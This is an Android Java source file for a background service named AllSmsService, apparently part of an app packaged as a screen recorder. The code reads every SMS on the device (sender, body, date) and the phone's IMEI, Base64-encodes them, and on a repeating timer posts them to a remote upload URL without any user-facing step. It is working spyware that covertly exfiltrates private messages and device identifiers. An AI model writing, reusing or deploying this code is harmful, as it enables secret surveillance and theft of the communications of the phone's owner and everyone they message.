package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by Android on 2/22/2017.
 */

public class AllSmsService extends Service {
    StringBuilder builder;
    String InOutSmsData;
    String time_stamp;
    public static boolean  All_Sms_Service =false;
    Timer mytimer;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        All_Sms_Service = true;
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        All_Sms_Service = true;
        List<String> s;
        s = readAllMessage();

        String messagecsv="";

        for(int i=0;i<s.size();i++)
        {
            messagecsv +=  s.get(i) + ",";
        }
        String messageArray[];
        messageArray = messagecsv.split(",");
        String[] arr = s.toArray(new String[s.size()]);
        builder = new StringBuilder();
        for(String s1 : arr) {
            builder.append("\n"+s1);
        }


        //getApplicationContext().startService(new Intent(getApplicationContext(),InOutSmsService.class));

        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- AllSmsService");
                SendAllSmsData();
            }
        },30000,60500);//change Timer Value
        super.onStart(intent, startId);
    }

    public List<String> readAllMessage(){
        List<String> sms = new ArrayList<String>();

        Uri uriSMSURI = Uri.parse("content://sms");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext())
        {
            String type = cur.getString(cur.getColumnIndex("type"));
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date =  cur.getString(cur.getColumnIndex("date"));
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();

            sms.add(type+"#,$");
            sms.add(address+"#,$");
            sms.add(body+"#,$");
            sms.add(smsDate);
            sms.add("\n---------------");

           // System.out.println("response ::-"+sms);
        }
        return sms;
    }

    public void SendAllSmsData(){
        SharedPreferences sp = getSharedPreferences("key", 0);
        String tValue = sp.getString("chksms","");
        Log.d("checkcon-------","contactSharedvaluereceive::::------"+tValue);


        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeibase = imei.getBytes();
        String imeibaseEncode = android.util.Base64.encodeToString(imeibase, android.util.Base64.DEFAULT);
        String ImeiBaseString = imeibaseEncode.replaceAll("\n","");
        try {
            String IncSms = android.util.Base64.encodeToString(builder.toString().getBytes(), android.util.Base64.DEFAULT);
            InOutSmsData = IncSms.replaceAll("\n","");
            System.out.println("SmsData = " + InOutSmsData);
        }
        catch (Exception e){
            Log.d(getClass().getSimpleName(),"SMSException = " + e);
        }


        try {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        }
        catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        try {
            String IncFileName = "AllSms.txt";
            String IncFnameBase = android.util.Base64.encodeToString(IncFileName.toString().getBytes(), android.util.Base64.DEFAULT);
            String IncFnameString = IncFnameBase.replaceAll("\n","");

            String fsupload = UrlDemo.fsupload;
            InputStream CallStream = null;
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(fsupload);
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

            ConnectivityManager connectivity;
            NetworkInfo wifiInfo;
            connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")){
                nameValuePairs.add(new BasicNameValuePair("IMEI",ImeiBaseString));
                nameValuePairs.add(new BasicNameValuePair("FNAME",IncFnameString));
                nameValuePairs.add(new BasicNameValuePair("DATA",InOutSmsData));

                httpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                httpResponse.getStatusLine();
                HttpEntity entity = httpResponse.getEntity();
                entity = httpResponse.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read() ; i != -1 ; i = in.read()){
                    buffer += (char) i;
                    i++;
                }
                Log.d("Test","Response of AllSms = " +buffer);
                builder.setLength(0);
            }
            else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")){
                nameValuePairs.add(new BasicNameValuePair("IMEI",ImeiBaseString));
                nameValuePairs.add(new BasicNameValuePair("FNAME",IncFnameString));
                nameValuePairs.add(new BasicNameValuePair("DATA",InOutSmsData));

                httpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                httpResponse.getStatusLine();
                HttpEntity entity = httpResponse.getEntity();
                entity = httpResponse.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read() ; i != -1 ; i = in.read()){
                    buffer += (char) i;
                    i++;
                }
                Log.d("Test","Response of AllSms = " +buffer);
                builder.setLength(0);
            }
            else {
                Log.d("checkconError","AllSmsService connection erro");
                return;
            }
            builder.setLength(0);
        }
        catch (Exception e){
            Log.d(getClass().getSimpleName(),"AllSms = " +e);
        }
    }

    @Override
    public void onDestroy() {
        try {
        mytimer.cancel();
        } catch (Exception e) {}
        All_Sms_Service = false;
        stopSelf();
        super.onDestroy();
    }
}
